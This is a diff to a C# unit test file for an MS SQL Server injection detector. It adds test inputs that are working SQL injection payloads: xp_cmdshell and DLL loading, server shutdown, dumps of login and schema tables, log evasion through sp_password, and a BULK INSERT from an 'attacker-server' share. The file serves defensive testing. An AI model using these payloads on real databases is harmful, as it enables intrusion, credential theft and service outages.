@@ -71,7 +71,35 @@ public sealed class SqlInjectDetectorMsSqlServerTests
             "UPDATE users SET password = (SELECT TOP 1 password FROM admin_users) WHERE username = 'admin';",
             
             // More xp_cmdshell
-            "EXEC master.dbo.xp_cmdshell 'dir'"
+            "EXEC master.dbo.xp_cmdshell 'dir'",
+
+            // sp_addextendedproc to execute arbitrary code
+            "'; EXEC sp_addextendedproc 'xp_webserver', 'c:\\temp\\x.dll'; --",
+
+            // Shutdown SQL Server
+            "'; SHUTDOWN; --",
+
+            // Querying system views for information gathering
+            "'; SELECT * FROM master..sysmessages; --",
+            "'; SELECT * FROM master..sysservers; --",
+            "'; SELECT * FROM master..sysxlogins; --",
+            "'; SELECT * FROM sys.sql_logins; --",
+            "'; SELECT * FROM master..sysprocesses; --",
+
+            // Using built-in functions for reconnaissance
+            "' OR 1=1; SELECT HOST_NAME(); --",
+            "' OR IS_MEMBER('guest') = 1; --",
+            "' OR IS_SRVROLEMEMBER('sysadmin') = 1; --",
+
+            // Getting database schema information
+            "'; SELECT name FROM sys.objects WHERE type = 'U'; --",
+            "'; SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'sometable'); --",
+
+            // Hiding queries from logs using sp_password
+            "'; SELECT 1; --sp_password",
+
+            // Out-of-band attack with BULK INSERT from UNC path
+            "'; BULK INSERT foo FROM '\\\\attacker-server\\share\\file.txt'; --"
         };
 
         // Act & Assert
